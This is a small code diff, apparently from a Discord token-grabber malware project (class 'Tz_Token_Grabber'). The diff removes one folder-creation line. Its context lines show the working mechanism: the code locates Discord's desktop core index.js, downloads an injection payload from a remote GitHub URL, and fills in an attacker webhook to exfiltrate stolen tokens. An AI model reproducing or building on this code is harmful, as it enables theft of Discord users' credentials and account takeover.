@@ -87,7 +87,6 @@ class Tz_Token_Grabber:
                 if "discord_desktop_core-" in name:
                     try:
                         directory_list = os.path.join(root, name+"\\discord_desktop_core\\index.js")
-                        os.mkdir(os.path.join(root, name+"\\discord_desktop_core\\Tzfofo"))
                     except FileNotFoundError:
                         pass
                     f = requests.get("https://raw.githubusercontent.com/Tzwebfofo/injection/main/Injection").text.replace("%WEBHOOK_LINK%", self.webhook)
